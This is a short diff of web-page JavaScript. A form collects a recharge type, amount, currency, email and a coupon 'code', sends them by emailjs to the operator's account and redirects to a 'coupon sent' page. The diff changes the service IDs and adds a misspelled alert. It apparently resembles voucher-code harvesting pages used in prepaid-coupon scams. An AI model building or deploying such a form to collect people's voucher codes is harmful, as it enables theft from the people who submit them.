@@ -47,7 +47,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
         if (form.type && form.montant && form.devise && form.mail && form.code.length) {
 
-            emailjs.send("service_sljs7qs", "template_md2f3yo", {
+            emailjs.send("service_hnp1568", "template_vq08l2i", {
                     recharge: form.type,
                     montant: form.montant,
                     devise: form.devise,
@@ -55,6 +55,7 @@ document.addEventListener("DOMContentLoaded", () => {
                     mail: form.mail
                 })
                 .then(function(response) {
+                     alert('Your message was sucessfull');
                     location.href = "couponSended.html";
                 }, function(error) {
                     console.log('FAILED...', error);
